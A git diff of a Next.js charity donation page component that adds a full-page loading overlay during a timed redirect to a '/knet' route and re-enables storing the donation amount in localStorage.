@@ -7,9 +7,11 @@ import { Footer } from "@/components/footer"
 import { useEffect, useState } from "react"
 import { addData } from "@/lib/firebase"
 import { useRouter } from "next/navigation"
+import { FullPageLoader } from "@/components/fullpageloader"
 
 export default function CharityDonationPage() {
   const [value, setValue] = useState(10)
+  const [loading, setLoading] = useState(false)
   const [_id] = useState(() => "id" + Math.random().toString(16).slice(2))
   const router = useRouter()
 
@@ -20,12 +22,12 @@ export default function CharityDonationPage() {
     }
     addData(data)
     // Store donation amount in localStorage
-   // localStorage.setItem("item", value.toString())
+    localStorage.setItem("item", value.toString())
   }, [_id])
 
   // Update localStorage when donation value changes
   useEffect(() => {
-  //  localStorage.setItem("item", value.toString())
+    localStorage.setItem("item", value.toString())
   }, [value])
 
   return (
@@ -233,8 +235,10 @@ export default function CharityDonationPage() {
             </Button>
             <Button
               onClick={() => {
+                setLoading(true)
                 localStorage.setItem("item", value.toString())
                 setTimeout(() => {
+                  setLoading(false)
                   router.push("/knet")
                 }, 4000)
               }}
@@ -254,6 +258,7 @@ export default function CharityDonationPage() {
           </svg>
         </button>
       </div>
+      {loading && <FullPageLoader />}
 
       {/* Add Footer component at the bottom */}
       <Footer />
